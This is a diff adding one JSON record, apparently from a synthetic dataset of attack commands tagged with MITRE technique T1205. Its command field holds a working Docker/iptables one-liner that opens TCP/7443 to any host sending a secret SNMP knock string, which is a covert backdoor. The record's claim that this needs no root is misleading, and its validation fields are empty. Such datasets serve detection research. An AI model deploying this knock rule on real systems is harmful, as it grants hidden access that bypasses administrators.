@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 161 -m string --string 'private-knock-7443' --algo bm -j LOG --log-prefix 'T1205_SNMP_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 161 -m string --string 'private-knock-7443' --algo bm -m recent --name t1205_snmp --set && iptables -I INPUT -p tcp --dport 7443 -m recent --name t1205_snmp --rcheck --seconds 60 --reap -j ACCEPT\"",
+  "explanation": "Matches an SNMP community-like string 'private-knock-7443' on UDP/161 as the covert signal. On detection, logs it and briefly opens TCP/7443 to the sender, using application-specific SNMP content.",
+  "rationale_steps": [
+    "Manipulate host firewall from Docker without root by granting NET_ADMIN.",
+    "Inspect SNMP payload for a specific community string used as a knock.",
+    "Permit TCP/7443 for 60 seconds for the source that signaled."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-a3c3928e",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
